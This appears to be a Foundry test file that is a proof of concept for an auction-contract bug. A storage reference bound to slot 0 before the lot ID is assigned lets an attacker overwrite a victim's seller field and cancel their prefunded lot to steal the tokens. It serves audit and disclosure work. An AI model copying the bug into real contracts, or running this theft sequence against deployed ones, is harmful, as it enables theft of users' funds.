// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.19;

import "forge-std/Test.sol";
import {ERC20} from "lib/solmate/src/tokens/ERC20.sol";

contract MockERC20 is ERC20 {
    constructor() ERC20("MockToken", "MOCK", 18) {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract BuggyAuctioneer {
    struct Routing {
        address seller;
        uint96 funding;
    }

    MockERC20 public immutable baseToken;

    uint96 public lotCounter;
    mapping(uint96 => Routing) public lotRouting;

    constructor(MockERC20 token_) {
        baseToken = token_;
    }

    // Vulnerable function (simplified from original)
    function auction(bool prefunded, uint96 lotCapacity) external returns (uint96 lotId) {
        // lotId is implicitly 0 on entry, so routing always targets slot 0
        Routing storage routing = lotRouting[lotId];

        // Real lot ID is assigned afterwards
        lotId = lotCounter++;

        routing.seller = msg.sender;

        if (prefunded) {
            routing.funding = lotCapacity;
            baseToken.transferFrom(msg.sender, address(this), lotCapacity);
        }
    }

    function cancel(uint96 lotId_) external {
        Routing storage routing = lotRouting[lotId_];
        require(msg.sender == routing.seller, "Not seller");

        uint96 amount = routing.funding;
        routing.funding = 0;

        if (amount > 0) {
            baseToken.transfer(msg.sender, amount);
        }
    }
}

contract ExploitTest is Test {
    MockERC20 token;
    BuggyAuctioneer auctioneer;

    address victim = address(1);
    address attacker = address(2);

    function setUp() public {
        token = new MockERC20();
        auctioneer = new BuggyAuctioneer(token);

        // Fund victim and approve auctioneer
        token.mint(victim, 1_000 ether);
        vm.prank(victim);
        token.approve(address(auctioneer), type(uint256).max);
    }

    function testExploitStealsPrefundedTokens() public {
        // Victim creates prefunded lot 0 with 1,000 tokens
        vm.prank(victim);
        auctioneer.auction(true, 1_000 ether);

        // Attacker creates a non-prefunded auction (intended lot 1) but corrupts slot 0
        vm.prank(attacker);
        auctioneer.auction(false, 0);

        // Attacker cancels lot 0 and steals the prefunded tokens
        vm.prank(attacker);
        auctioneer.cancel(0);

        // Verification
        assertEq(token.balanceOf(attacker), 1_000 ether, "Attacker should have stolen funds");
        assertEq(token.balanceOf(address(auctioneer)), 0, "Auctioneer balance should be zero");
    }
}